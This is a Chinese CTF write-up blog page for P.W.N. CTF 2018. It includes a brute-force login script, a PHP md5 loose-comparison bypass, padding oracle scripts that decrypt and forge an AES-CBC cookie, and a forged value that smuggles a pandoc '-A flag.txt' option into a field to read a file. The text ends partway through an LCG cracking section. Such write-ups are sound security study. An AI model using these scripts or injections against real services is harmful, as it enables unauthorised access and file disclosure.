@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Login SecLogin 1的代码如下:
+123456789101112131415161718192021222324252627282930var http = require(&amp;apos;http&amp;apos;);const crypto = require(&amp;apos;crypto&amp;apos;);var url = require(&amp;apos;url&amp;apos;);var fs = re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="P.W.N. CTF Writeup">
+<meta property="og:url" content="http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="Login SecLogin 1的代码如下:
+123456789101112131415161718192021222324252627282930var http = require(&amp;apos;http&amp;apos;);const crypto = require(&amp;apos;crypto&amp;apos;);var url = require(&amp;apos;url&amp;apos;);var fs = re">
+<meta property="og:image" content="https://i.loli.net/2018/11/01/5bdad0df8f22e.png">
+<meta property="og:image" content="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png">
+<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc0a1864318.png">
+<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png">
+<meta property="og:image" content="https://i.loli.net/2018/11/02/5bdc17d94dd01.png">
+<meta property="og:updated_time" content="2018-11-02T10:33:59.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="P.W.N. CTF Writeup">
+<meta name="twitter:description" content="Login SecLogin 1的代码如下:
+123456789101112131415161718192021222324252627282930var http = require(&amp;apos;http&amp;apos;);const crypto = require(&amp;apos;crypto&amp;apos;);var url = require(&amp;apos;url&amp;apos;);var fs = re">
+<meta name="twitter:image" content="https://i.loli.net/2018/11/01/5bdad0df8f22e.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>P.W.N. CTF Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/About/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Proyectos</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/11/02/Cracking-LCG/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
+      <span id="i-top" class="info" style="display:none;">Arriba</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&text=P.W.N. CTF Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&is_video=false&description=P.W.N. CTF Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=P.W.N. CTF Writeup&body=Check out this article: http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&name=P.W.N. CTF Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Sec"><span class="toc-number">1.</span> <span class="toc-text">Login Sec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Converter"><span class="toc-number">2.</span> <span class="toc-text">Converter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCG-and-the-X"><span class="toc-number">3.</span> <span class="toc-text">LCG and the X</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H-pster-Startup"><span class="toc-number">4.</span> <span class="toc-text">H!pster Startup</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        P.W.N. CTF Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-02T10:33:15.000Z" itemprop="datePublished">2018-11-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Login-Sec"><a href="#Login-Sec" class="headerlink" title="Login Sec"></a>Login Sec</h1><p><strong>Login 1</strong>的代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">var http = require(&apos;http&apos;);</div><div class="line">const crypto = require(&apos;crypto&apos;);</div><div class="line">var url = require(&apos;url&apos;);</div><div class="line">var fs = require(&apos;fs&apos;);</div><div class="line"></div><div class="line">var _0x86d1=[&quot;\x68\x65\x78&quot;,&quot;\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73&quot;];</div><div class="line"></div><div class="line">function generatePart1() &#123;</div><div class="line">    return</div><div class="line">         &#123;</div><div class="line">             x: crypto[_0x86d1[1]](8)</div><div class="line"></div><div class="line">         &#125;[x].toString(_0x86d1[0]);</div><div class="line">&#125;</div><div class="line">function generatePart2() &#123;</div><div class="line">    return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">http.createServer(function (req, res) &#123;</div><div class="line">    res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/html&apos;&#125;);</div><div class="line">    passwd = generatePart1() + generatePart2();</div><div class="line">    var url_content = url.parse(req.url, true);</div><div class="line"></div><div class="line">    if (passwd == url_content.query.passwd) &#123;</div><div class="line">       res.write(fs.readFileSync(&apos;flag.txt&apos;, &apos;utf8&apos;));</div><div class="line">    &#125; else &#123;</div><div class="line">        res.write(&apos;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&apos;);</div><div class="line">    &#125;</div><div class="line">    res.end();</div><div class="line">&#125;).listen(8888);</div></pre></td></tr></table></figure>
+<p>我在此将其简化一下，方便本地运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">const crypto = require(&apos;crypto&apos;);</div><div class="line"></div><div class="line">var _0x86d1=[&quot;\x68\x65\x78&quot;,&quot;\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73&quot;];</div><div class="line"></div><div class="line">function generatePart1() &#123;</div><div class="line">        return</div><div class="line">                 &#123;</div><div class="line">                         x: crypto[_0x86d1[1]](8)</div><div class="line"></div><div class="line">                 &#125;[x].toString(_0x86d1[0]);</div><div class="line">&#125;</div><div class="line">function generatePart2() &#123;</div><div class="line">        return [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">    passwd = generatePart1() + generatePart2();</div><div class="line">    console.log(passwd)</div></pre></td></tr></table></figure>
+<p>运行结果为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  node login.js</div><div class="line">undefined1337</div></pre></td></tr></table></figure>
+<p>提交<code>undefined1337</code>得到flag的第一部分<code>flag{W0w_1_gu3ss_th1s</code></p>
+<p><strong>Login 2</strong>的代码如下，可以看出是md5的弱类型比较，只要求md5之后的值开头是0e即可，提交<code>s878926199a</code>得到下一部分的flag<code>_t0_be_4_pr3tty_</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include(&quot;flag.php&quot;);</div><div class="line">if (isset($_GET[&apos;passwd&apos;])) &#123;</div><div class="line">        if (hash(&quot;md5&quot;, $_GET[&apos;passwd&apos;]) == &apos;0e514198428367523082236389979035&apos;)        &#123;</div><div class="line">                echo $flag;</div><div class="line">        &#125; </div><div class="line">&#125; else &#123;</div><div class="line">    echo &apos;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&apos;;</div><div class="line">&#125; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><strong>Login 3</strong>部分代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from flask import Flask, request, send_from_directory</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">passwd = open(&quot;/opt/passwd.txt&quot;).read()</div><div class="line">flag = open(&quot;/opt/flag.txt&quot;).read()</div><div class="line"></div><div class="line"></div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def index():</div><div class="line">    userpw = request.args.get(&quot;passwd&quot;, &quot;&quot;)</div><div class="line">    if userpw == passwd:</div><div class="line">        return flag, 200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;</div><div class="line">    else:</div><div class="line">        return &apos;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&apos;</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    assert(len(passwd) == 3)</div><div class="line">    assert(passwd.isdigit())</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
+<p>关键在于一下两行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">assert(len(passwd) == 3)</div><div class="line">assert(passwd.isdigit())</div></pre></td></tr></table></figure>
+<p>这两行判断了从<code>/opt/passwd.txt</code>中读出的内容的长度是否是3，类型是否是数字。一般我们可能会字节考虑<code>100-999</code>,但是要知道<code>000、009</code>这些长度也是3，也是数字类型。所以写爆破脚本如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">for i in range(0, 1000):</div><div class="line">        url = &quot;http://login3.uni.hctf.fun/?passwd=%03d&quot; % i</div><div class="line">        r = requests.get(url).content</div><div class="line">        s = &quot;&quot;&quot;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;</div><div class="line">        if(s != r.decode(&apos;utf-8&apos;)):</div><div class="line">                print(i)</div><div class="line">                break</div></pre></td></tr></table></figure>
+<p>最终爆破得到结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  python testlogin.py</div><div class="line">7</div></pre></td></tr></table></figure>
+<p>提交<code>007</code>得到最后一部分flag <code>4_d4mn_l0ng_fl4g}</code></p>
+<h1 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h1><p>target:<code>http://converter.uni.hctf.fun/</code></p>
+<p>分析之后，可以看到vals的长度是16的倍数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">content=test</div><div class="line"></div><div class="line">vals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9</div><div class="line"></div><div class="line">128个字符</div><div class="line"></div><div class="line">content=testtest</div><div class="line"></div><div class="line">vals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961</div><div class="line"></div><div class="line">160个字符</div><div class="line"></div><div class="line">content=testtestte</div><div class="line"></div><div class="line">vals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265</div><div class="line"></div><div class="line">160个字符</div></pre></td></tr></table></figure></p>
+<p>比如以下这组数据:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">content=t</div><div class="line"></div><div class="line">vals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551</div></pre></td></tr></table></figure>
+<p>我们修改vals的第一位后发送请求，得到一个错误<code>JSONDecodeError: Expecting value: line 1 column 1 (char 0)</code>，修改最后一位发送请求，得到一个<code>ValueError: Invalid padding bytes.</code>。由以上两点可以看出，cookie中包含<code>AES-CBC-encrypted JSON</code>数据。所以在这种分组加密中我们可以联想到Padding Oracle攻击，关于这种攻击可以参考:</p>
+<p><a href="https://www.jianshu.com/p/ad8bdd87e131" target="_blank" rel="external">《Web狗要懂的Padding Oracle攻击》</a></p>
+<p><a href="https://err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/" target="_blank" rel="external">《Padding_Oracle 攻击》</a></p>
+<p>接下来我们使用脚本将cookie值进行解密:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"># you need get padding_oracle from there</div><div class="line"># https://github.com/pspaul/padding-oracle</div><div class="line"># you need python3</div><div class="line"></div><div class="line">from padding_oracle import PaddingOracle</div><div class="line">from optimized_alphabets import json_alphabet</div><div class="line"></div><div class="line">import requests</div><div class="line"></div><div class="line">def oracle(cipher_hex):</div><div class="line">    headers = &#123;&apos;Cookie&apos;: &apos;vals=&#123;&#125;&apos;.format(cipher_hex)&#125;</div><div class="line">    r = requests.get(&apos;http://converter.uni.hctf.fun/convert&apos;, headers=headers)</div><div class="line">    response = r.content</div><div class="line"></div><div class="line">    if b&apos;Invalid padding bytes.&apos; not in response:</div><div class="line">        return True</div><div class="line">    else:</div><div class="line">        return False</div><div class="line"></div><div class="line"></div><div class="line">o = PaddingOracle(oracle, max_retries=-1)</div><div class="line"></div><div class="line">cipher = &apos;b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763&apos;</div><div class="line">plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())</div><div class="line">print(&apos;Plaintext: &#123;&#125;&apos;.format(plain))</div></pre></td></tr></table></figure>
+<p>解密后cookie的内容为<code>{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}</code>，一般这种文档转换使用的是<code>pandoc</code>，此处的<code>f</code>是控制输入格式，<code>c</code>是我们输入的内容，<code>t</code>是控制输出格式。</p>
+<p>由题目可知我们要读取flag.txt中的内容，所以我们使用pandoc的<code>-A</code>参数，把flag.txt的内容包含出来。</p>
+<blockquote>
+<p>-A FILE, –include-after-body=FILE<br>Include contents of FILE, verbatim, at the end of the document body (before the  tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies –standalone.</p>
+</blockquote>
+<p>要注意此处前端好像有白名单过滤，直接代入我们的参数话得不到我们想要的结果。</p>
+<p><a href="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" alt="屏幕快照 2018-11-01 下午6.06.45.png"></a></p>
+<p>所以我在抓包之后修改cookie的值。cookie的生成脚本如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from padding_oracle import PaddingOracle</div><div class="line">from optimized_alphabets import json_alphabet</div><div class="line"></div><div class="line">import requests</div><div class="line"></div><div class="line"></div><div class="line">def oracle(cipher_hex):</div><div class="line">    headers = &#123;&apos;Cookie&apos;: &apos;vals=&#123;&#125;&apos;.format(cipher_hex)&#125;</div><div class="line">    r = requests.get(&apos;http://converter.uni.hctf.fun/convert&apos;, headers=headers)</div><div class="line">    response = r.content</div><div class="line"></div><div class="line">    if b&apos;Invalid padding bytes.&apos; not in response:</div><div class="line">        return True</div><div class="line">    else:</div><div class="line">        return False</div><div class="line"></div><div class="line"></div><div class="line">o = PaddingOracle(oracle, max_retries=-1)</div><div class="line"></div><div class="line">cipher = &apos;b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763&apos;</div><div class="line">plain     = b&apos;&#123;&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;&#125;&apos;</div><div class="line">plain_new = b&apos;&#123;&quot;f&quot;: &quot;markdown -A flag.txt&quot;, &quot;c&quot;: &quot;D&quot;, &quot;t&quot;: &quot;html4&quot;&#125;&apos;</div><div class="line"></div><div class="line">cipher_new = o.craft(cipher, plain, plain_new)</div><div class="line">print(&apos;Modified: &#123;&#125;&apos;.format(cipher_new))</div></pre></td></tr></table></figure>
+<p>最终得到flag<br><a href="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" alt="屏幕快照 2018-11-01 下午6.03.36.png"></a></p>
+<h1 id="LCG-and-the-X"><a href="#LCG-and-the-X" class="headerlink" title="LCG and the X"></a>LCG and the X</h1><p>打开主页看到如下描述，最后一句<code>Save secret messages prefixed with &quot;flag{&quot; (which is always handy...)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Hello!</div><div class="line">This is the website for our on-campus fanclub of the band LCG and the X!</div><div class="line">Everyone can signup for the club to:</div><div class="line"></div><div class="line">   Get the latest LCG news</div><div class="line">   Communicate with other fans</div><div class="line">   Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...)</div></pre></td></tr></table></figure>
+<p>接下我们进行注册登录，注册后可以看到如下信息：</p>
+<p><a href="https://i.loli.net/2018/11/02/5bdc0a1864318.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc0a1864318.png" alt="屏幕快照 2018-11-02 下午4.25.25.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User Number: 34 </div><div class="line">Password: 4391179335210642486020975422279755323</div></pre></td></tr></table></figure>
+<p>bitmap图片的地址为<code>http://lcgandthex.uni.hctf.fun/static/pics/34.bmp</code>，bitmap图片名称前面的序号和我们用户名的相同，所以如果我们更改图片前面的序号还可以下载其他的bitmap图片。而这个bitmap图片还是作为password recovery token来使用的，所以我们就可以利用它来重置别的账户的密码。</p>
+<p>接下来我们进行登录，登陆后可以看到这样的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">News</div><div class="line">Website Launch</div><div class="line">I just took the website online. I wrote it myself! </div><div class="line">I also just signed up to make sure the signup process works.</div><div class="line">Then I created a secret flag, which worked as well!</div><div class="line">Flag Storage Maintenance</div><div class="line">Because of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon...</div></pre></td></tr></table></figure>
+<p>可以看到对于我们这个账户而言，密码是被隐藏的，因此可能我们需要登录管理员的账户进行查看？那么管理员有可能是序号为1的那一个？那么我们就要考虑怎么去获取1号的密码了。因为这里的password recovery token没有地方去让我们使用，比赛结束后也有看别的战队是使用如下脚本分析了bitmap图片然后得到一些信息之后进行LCG破解的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import math</div><div class="line">import os</div><div class="line">import sys</div><div class="line">import imageio</div><div class="line"></div><div class="line">if len(sys.argv) != 2:</div><div class="line">    print(&quot;Usage: %s file.bmp&quot; % sys.argv[0])</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">filename = sys.argv[1]</div><div class="line"></div><div class="line">image = imageio.imread(filename)</div><div class="line">out = 0</div><div class="line">for line in image:</div><div class="line">    tmp = 0</div><div class="line">    for x in range(len(line)):</div><div class="line">        tmp &lt;&lt;= 1</div><div class="line">        tmp |= 1 if line[x] == 255 else 0</div><div class="line">    print(&quot;% 40d&quot; % tmp)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">对比两个用户bitmap图片中的信息可以发下现两者相差 313373133731337313373133731337</div><div class="line"></div><div class="line">这里只截取前五行</div><div class="line"></div><div class="line">34.bmp</div><div class="line">        10778143335877814333587781433348</div><div class="line">   8024293302815125776712035454147967229</div><div class="line">   8424888415969153255243735974754402615</div><div class="line">   3343897317520929957383430099400071436</div><div class="line">  12356584033995394658660863293223597252</div><div class="line">  </div><div class="line">35.bmp</div><div class="line">        11091516469609151646960915164685</div><div class="line">   9972138259316515878515303887207190382</div><div class="line">   7570417892854896822411051461517328212</div><div class="line">  16016475982551891670926030402121628733</div><div class="line">   9296242651229076123142121777120916609</div></pre></td></tr></table></figure>
+<p>之后再推算出一下值之后进行的攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = 16285270385112413720426683811263350667</div><div class="line">a = 313373133731337313373133731337</div><div class="line">c = 123456789012345678901234567890</div></pre></td></tr></table></figure>
+<p>但是我们这里不这么干，密码是LCG生成的(因为题目本身就提示了LCG这个算法)，那么我们这里就属于不清楚a\c\m的值对LCG生成器进行攻击，那么连续注册几个账号，采集一下密码输入一下脚本就好了。着这里使用burp多重放几次数据包就可以了，不用次都去输信息注册。</p>
